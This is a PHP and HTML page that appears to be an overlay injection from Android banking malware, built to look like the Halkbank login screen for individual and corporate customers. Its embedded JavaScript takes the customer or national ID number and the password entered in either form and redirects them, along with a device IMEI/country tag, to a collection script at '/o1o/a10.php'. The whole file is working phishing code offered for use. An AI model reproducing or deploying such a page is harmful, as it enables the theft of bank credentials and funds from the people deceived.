<html>
<head>
<meta charset="UTF-8">
<link href="http://getbootstrap.com/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="data:text/css;charset=utf-8," data-href="http://getbootstrap.com/dist/css/bootstrap-theme.min.css" rel="stylesheet" id="bs-theme-stylesheet">
<link href="tr/com.tmobtech.halkbank/style.css" rel="stylesheet">


</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>


    	<img width="30%" src="tr/com.tmobtech.halkbank/logo.png">


       

<div id="content_div1">
 <form method="post">

<A href="#" class="hr1">Bireysel</A><A href="#" class="hr2" onclick="document.getElementById('content_div1').style.display = 'none'; document.getElementById('content_div2').style.display = 'block';">Kurumsal</A><div style="clear:both"></div>

<div class="bg" style="z-index: 99;">
 <div class="glyphicon glyphicon-user nn1" style="color:white;"></div>
		<div class="field">
			<input type="text" name="fields[login]" class="input" id="id" placeholder="Müşteri/TC Kimlik Numarası" onKeyUp="if(this.value>99999999999){this.value=this.value.substr(0,11);}" placeholder="">
		</div>
  <div class="glyphicon glyphicon-lock nn2" style="color:white;"></div>
  <div class="field">
			<input type="password" name="fields[password]" placeholder="Parola" class="input" id="pass" maxlength="25" placeholder="">
        </div>
        <button id="input_submitBtn" onclick="SentServer1();" class="s1" type="submit">Giriş Yap</button>
        <p style="text-align: right; color: #979797;"> Parolamı  Unuttum </p>

</div>
<img style="margin-top: -29.5px;z-index: 100;position: relative;" src="data:image/png;base64,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">


 </div>


</form>
  <script type="text/javascript">
  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('pass');

						try{
							oNumInp.className = 'input';
							oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|halkbank_bireysel|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>

 <div id="content_div2">
 <form method="post">
<A href="#" class="hr11" onclick="document.getElementById('content_div2').style.display = 'none'; document.getElementById('content_div1').style.display = 'block';">Bireysel</A><A href="#" class="hr22">Kurumsal</A><div style="clear:both"></div>

<div class="bg2">
 <div class="glyphicon glyphicon-user nn11" style="color:white;"></div>
 		<div class="field">
			<input type="text" name="fields[login]2" class="input" id="id2" placeholder="Müşteri Numarası" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,10);}" >
		</div>

  <div class="glyphicon glyphicon-th nn33" style="color:white;"></div>
  		<div class="field">
			<input type="text" name="fields[password2]" placeholder="Parola" class="input" id="ii" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,10);}" >
		</div>

  <button id="input_submitBtn3" onclick="SentServer2();" class="s2" type="submit">Giriş Yap</button>
  <p style="text-align: right; color: #979797;"> Parolamı  Unuttum </p>
 </div>
 <img style="margin-top: -29.5px;z-index: 100;position: relative;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA7CAYAAADFJfKzAAAQWElEQVRo3s2be7BdVX3HP7/f2nufc5Lc3JCbmAtJSEJIIDzCI0VAUMFaYjqVUVuJjshMrYoFq1MEB6xa27HilMpQWyyDFmlE21iLDswUHZ2KaBU1DyAvGohGQsi9zcO87nntvdavf+x9Dufe3HMfJKnumTvJvmfdtdZ3/V7f3++3jnCcj5k5ABHxHb87z8PrQuBKYDmwSIUpKiCdfwsEg2BUgV8Cz6jyIwdPiMjmsdZ4JY8cB0gtNhCK96Ue/sgC10K4MFItjfZ3wXKQAmiX1bMQGqBPifKIg2+IyPbR1jzpYM0s32dxymb22gB/FuDaCNoADzVD2DIU7OkjXp+tmfyqYRxMjX2eNtpZDmbEwoKScHZF7IIeF86dqtKbqLaBQ0PhEYV/EJEfdkg6iIidNLBmph2SXB7gL4G3tXZ2oBmyx/Zl+sh+Lz85HGRXM9fRYSuJdE74sj6Ti3p+Ilw+Xe3aWc5W9UVhZqIRQCHKhxX+SkSeGbmfEwrWzJyIeDNLAnw8BG6LlDJgzx314f6XUl2718uuerG2E2LJVVU68FiHLFq4pcN+UwN8Pmh+WVk929n758ZhyVSngGSBuip3KXxaRJqtfZ0wsGYWiUhmZueGwD+rcinAQD34u15oui8NZBxODZxQ0uG2+UrsqmXLjZADnx4L7+2PuO30xPeX1QGEwE9V+RMR2dLa33GD7QD6Vh/Cl51qL5CteSl1f/HLprxYD2gkJJILxDhxj+QKQtMgZMa8svI3ixK74bTYA5EP4ZBT/WMR+eZEAMsEgd5kcK8Ah9LgP7S96dYMpOCEsp54kN1A1wtJ39Af8/mlie+N1RW+7mYR+cJ4gGUCQG8BPgeE7dXAdZvr+vQRTykWzNqO4//l0cLOG6lxYY9j7XnlsHSKtj76iIjcPRZgGQfo+4D7Ab/hsNdrn6nJ7qZRjoTM+I09kUA9M+YmwiPLK3bxdBcAB7xfRL7YDbCM4XVXBnhMITx1xOs1T9VkbwZlx28U6DDAHmZH8N0LK3ZBjwsBVGGViHxnNC8to7AiA+YH2KAwc2ct2Os21HRX0yi5dlT4rXicQMPD6YnwxMWVsKCiEuCAwsXArpxsvRyHdTRJB3hQoa8eQli9pa67GoHybxlQinBcdvBCI3DdlrrWQwgKfQEeHE2YOlJ9gZsVrgayW59L3c8O+jFt1MnLPzpBr6rFeJmAQ+qcf1QebVCOhJ8d9Nz6XOqArNj/zYU5umGS7FDffh/Y5pSeb+9NZdUzdSnF0lWiAqSdcUeFWLuHIQN8x6m5SLoCFoazKQRiJ13ndoWXfmx52d40OzYfOOKUZcBAS521zdxELMAnnNJbC4RbdqQi2n1ykRzoqr6Ib55f4YFlZRaXhTQcm820XiODjy1I+M8LKnxsQUJko3tJFUgDLC4JDywr883zK6zqi0i9DaPWIw9SVLhlRyq1QHBKb4BPFMmCAEiHVBdlgS2RknzuVw259bmmlJPR1VcLoJf2OH68Ykp7A1uHApevrzJkuQraiFO/c3GJ2xcm7Xk+u7PJHTsadGqPFKR/qsBPVkzhnKna5tSvWV/lp0c8sZN2fnGMh24af7cksY8sKFkWaEbKuUWuLFqkaxbg5kgpH0xDuGd3JhqNPmHLlizAH/RFWMFsmgbnTFUumqp4P1y63kBVeOusiGaAaoBmgLfMilAdbiYq4D1cNFU5Z6rSNKgFMCnWC919QzDQSLhndyYHU0KklENuuwaoFuRhug9cD/C1gUxfrAZi7c6OrBDBhqMeBcoKicDhzHi+bqgy7KBUIARj49FAolBRSBSeGgqEYMMOJlgeLJ+vG4czI5F8vJKvh3T3CQGIFV6sBr420FQAH7jezKaLSNY6pJWx8ioP/suDmcoYjqAlqdgJ39qX8alfNDmSGTuqgXdtqbO7EYhGOikD54TbdjR4dG/GS3Xj0b0Ztz3fwLnhuzcgUtjdyOfbWQsczIxP/aLJt/ZlxE7GDIEGiBO+PJipBx8rrwJWtn1D09u/xsrqnx/y/vINtUh0YnFOBZr1wCMXTuGrgxlr9zQpl3VUO2971wCnxPDrNLeHuIukYoFaLXDrohJLpynv31SjVNEJx3oL8JOLK9klvc6lgbWJk3eqmfUAVwLy6N7U+WBEE0zppQgfVgDXSMYMO7FAHMFBn/8by9hhSiMhKsaMFaZGc1Q+GI/uTV2xzSvNrEeBi5wyFzMePxRkLJvoptKd9jbmaRdeNZL83/HW6SwATIa9tXzK44eCYIZT5gIXaeq5TEEGm+a3VQOiMu6mj7v8epJpZLA85m6rGoNN8wqS4xQuBNheDexL7VjncoKLWdLKS0/yYUYK+9LA9mpoLXyhGiwB2FENgo3Pb0erFxV+p2sdeFh8Jo/JxvhrjZx7MgekBeod1SDFf5eowKkAO+sm2OQm9EDIckeTSF4nGutgmgHEYEkiiBXvY6ljZjigLPk6frKaZgWu/P3UCOgFOJCZTFa3JMB955T53b6IFb2OSOCBgZRkBPvSIjtZWhHWLCtz3lRl81Dghm11nq/lphNGSLSeGe+Zn/DnCxJ6IqFxLnzo+cbkpCEFrvzpVQgVgKOTODYnkGXGdbMjbpwXEyvMSYT7zi6zuKJ5MjBi0RCMuxeXuLTXUXLCpb2OuxeXCDZcnZQiCago951dZnaSl2dvnBfz9tkRmbeu6d5oz9H2KYaKttQ7TMJTto2gIu36btNyicxL8kKcjKSAIiyqKKnlY1ODRRVFZbgWSBGWTkskz6ysqCqSawZhYsK1Y8Ohqqg2AUoyca8aLKdk39ibMeQt57oC+1Pjh4dzutgJwBWSXTOQEgtMKZjTmoGUEIZLyopDW3c0MJQZccGNh7zxjb0Z4iYWGltTtnGpNiMLDKGUpkft5tr4YAvXvmnIuGpjjff1x+yqBy6b4fjHpSVu2lqnVJI2KfAGUST87a6UwaZxZa/jR4c8/zKYEUXD07uWY/ra8grfPuB55ohnQVn54kDKpiEjdpMr37ZwWWAoAvYDM/vjyVEnI6d8644E1h2qg0HJCU+sqPD3Z5f58LN1yiUZVkB3Cg/uSXlwT5rTug5e2gpjjYbx0PkVTomEN2ys5lIsPoyj4b2iiWyyP26vsV+N8ALAGRW1yVJFM0gclGKhkgipwNUbarxhhuOupSXqjWOdSSmW9s/I2lSjYdx7TpmFZeGNT1XRKJ+3FAuJmxzQFmU8o6KWv4cXVNEtAEumqCUur0xMxrsHy9U0tVy1a8CVG6pcOyvirxfngKMRiXzrp9Om6w3j7rNKXDZduXpjDVPJKyLF2MlQWClCXeKEJVNysIpuUTHWASyuOJlfEnx45VQuWJ6UHwpwxfoq1/dHfHRRQr2RO5quxe6G8ekzS/x+X8RV62t4yVX+lXJ0yZN25peExVNcUX9inTrHkx5qlQh9dY+ahO5FrW4TRx2lUW9QcrDPw+UbqnxgXsIHT0+oFRLWYrxK7pHrDeOjixLeOSfiivVVjhQaEuxl9Y4mSRVFQILx6h61ikM91JzjSQV2WGCzAStPcZOy/1ZCXk+NRmptL5kVgAebxmvXD3HHgoQb58XUG0Yz5OObHmoN44OnJ3xgXsJrNlTZ7/O/Cx0N+UZq1FMjnaR5deKxwGZgRyQiIfX2HYFL3tQXhb6kqb/2+YnaOKeXeuhPhLf0RxzM4OF9Gb5VNDMoRcLuhnH1xio/XjGFoQCbhwJXz3B8/6Dn4mnKxxcmXLKuymDTKBVhSFpEBHjHnJgZEXxrv2egmYeesSQiBQObmQhv6otCoUzfEZHQKpJf4AMbncINW2rylYGMcty9C9BS19Ni4fsXVTgzbxuydiDlXdsaaMeGWh235VOVR5dXOLWkxJpvaE8jsOrpGlurYVjXQQSCh68uK7G6Pwbg+Wrg6o01XkptTEFEkmvOu/sj1pxbMR/AKReJyNNaXMJ42uBJgBtPi73K2BmGEwjeuH5OxJlTlHrIVXd1f8yKaUraUUrNCgk/czTwQsOINS+Nxgq/qhtbhwKlDqBaaMyKacrq/pisoItnTlGunxMRxuHGLc26Me/OY/CkiDxtZtrmxpHyeUCuOCVi5cyINBufcLeSh5YTAagFO4Zkm4FTwY3sEEj++2FqacPniTr6POMlK04gzYyVMyOuOCUCkAJXzo0BX9xtejgL4VlAP7kw8W6MpMBbXgB7aDDl8QNZXjgz+MzOJpuGAslISicQMO74RZPBhlFWGGzk72FEEh3IicqmocBndjYxy7324wcyHhpMcVH3UqoVHelPLkw8oAWehwt8XkY0oK8D1gLZ+56tR1/anXa13ZYnjoGrpisHPfz8iCfqog5SnPq8snJ+RdlUC7xYD8SRdHU4mTcu6XHMcPD44UBK94pky1bfOzfmi2eXMyACVovI11v4ZGTLMvP2uFNev78Z/MXrau7FhhG50QN8qy/jfZ7TJW5sIqCSVyeKnI9EJzDe53bgnAzrH40cl3mYVxI2/E7F9yXqfOAHkZOrOjvwOtJanHJTgEZfoty/NDErjl261XbJHdB4QFsMK5Z8fCwTG5+4fHw3oPKysLh/aWJ9iRKg4ZSbRqbo+rKaSShOYavC7YBbOSvO7jyjRLPZ3Vm1UriJUrvWeJsEBR1rvBNoNo07zyixclacFcnV7SKytcATxrpA0rop83Xg7UB60/804n/a1cwzm9+iqwaxQK1p/On8hC+cVUrJXci/i8h1o92YGQ2sFL+vBPiBwgogu2FbPfrK7pRyIif9kteE2i5FL/bdc2PWLMsdUoD1Cq8nT75s5K1VPdZr5gNEZEjhzcB2IFqzrJx9+PSEetNyFy+/GaAt9lRvGh8+PWkDBbYrvFlEhjpxjAm2w35VRPYA14TAs0B0z9JSes9ZJSRAw9uks5HjlWYk+boS4J6zStyztJQCUbG/a0Rkz1jXcse7u9iKv3OA/wCuALIfHsjczc81ZNORgItzz3qyVLulsqmBT43ze5R7l5TstTMjX0j0v4E/FJHB8a7jTuRWagtwGbgXeA/A0Yzszp2N6PO7U45m1r6ZGk7QfUZtxdniRuq0SPjQ3Jg7FpayaRFRMewB8msE9YncO57ofePOG+TvyUK4K1KdCYStR73dvSt1a/8342iWk4XY5bSt1aK0cerRLY8orQIAeTJAyEGuflXELfNjf840JwUNPBCp3iYiD4zc34lovg37boCZLQxwp8I7Wh9vP+rDQ4OpPrzPy5ZqyMVbVAXdGJe8rKMu1fltiXOnKm+b5ez6OXFYOs21G38B/k3hDhHZOdnvCrySL0S4ji9DvMEHbnfK77U+b3r8Tw+lfO9gkCcPe91eNQZSo97NqAXKTuiPhaVThMumu/DGGWqX9sYkrp0o4QPfdcpnReS/Ru7jRLdVj1Hrltcu3l+XwXst8OZYmTEsDUxDeLFhtqdp7G0G+XVGW3qnRDA7UTs1EeaVRKbFOiw6pIGDojwawZdE5InR1j7pYDul3KlGZtYPvDENrBJ4tSgLHW1nMpEWaGaBnQY/i5XHgO+JyMBIMzoez378ne7Rv7VVAc72cJ7BMgssNJgD9Ag4y/3QEYFBUXYKbHOwGXhWRGpjzf1Kn/8DBe5tNvZ45N4AAAAASUVORK5CYII=">
</form>
  <script type="text/javascript">
  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn3');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id2');
                        var oCodeInp = document.getElementById('ii');

						try{
							oNumInp.className = 'input';
							oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|halkbank_kurumsal|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>
</div><div class="alt">
	<img width="100%" style="bottom: 15px;" src="tr/com.tmobtech.halkbank/alt.png"></div>
</body>
</html>
